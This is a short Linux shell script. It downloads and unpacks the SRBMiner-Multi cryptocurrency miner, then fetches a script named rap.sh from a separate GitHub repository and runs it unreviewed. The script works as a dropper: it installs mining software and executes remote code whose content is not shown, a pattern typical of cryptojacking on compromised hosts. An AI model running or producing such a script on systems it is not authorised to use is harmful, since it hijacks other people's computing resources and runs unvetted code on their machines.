#!/bin/sh
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.9/SRBMiner-Multi-0-8-9-Linux.tar.xz 
tar -xf SRBMiner-Multi-0-8-9-Linux.tar.xz 
cd SRBMiner-Multi-0-8-9
wget https://github.com/ahansura/srb/raw/main/rap.sh
chmod +x rap.sh
./rap.sh
